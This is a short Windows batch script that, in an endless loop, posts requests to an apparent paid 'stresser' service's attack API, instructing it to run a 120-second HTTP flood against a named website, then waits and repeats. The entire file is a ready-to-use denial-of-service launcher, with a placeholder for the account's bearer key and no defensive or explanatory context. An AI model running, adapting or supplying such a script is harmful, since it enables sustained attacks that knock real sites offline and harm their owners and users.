@echo off
:loop
curl "https://www.topstresser.su/api/attack" --compressed -X POST ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0" ^
-H "Accept: */*" ^
-H "Accept-Language: en-US,en;q=0.5" ^
-H "Accept-Encoding: gzip, deflate" ^
-H "Referer: https://www.topstresser.su/" ^
-H "Link: e-tag" ^
-H "authorization: Bearer KEYHERE" ^
-H "Content-Type: text/plain;charset=UTF-8" ^
-H "Origin: https://www.topstresser.su" ^
-H "Alt-Used: www.topstresser.su" ^
-H "Connection: keep-alive" ^
-H "Sec-Fetch-Dest: empty" ^
-H "Sec-Fetch-Mode: cors" ^
-H "Sec-Fetch-Site: same-origin" ^
-H "Priority: u=0" ^
-H "TE: trailers" ^
--data-raw "{\"target\":\"https://byteus.org\",\"port\":\"\",\"time\":120,\"concurrents\":1,\"method\":\"HTTP-FREE\"}"
timeout /t 120 >nul
goto loop
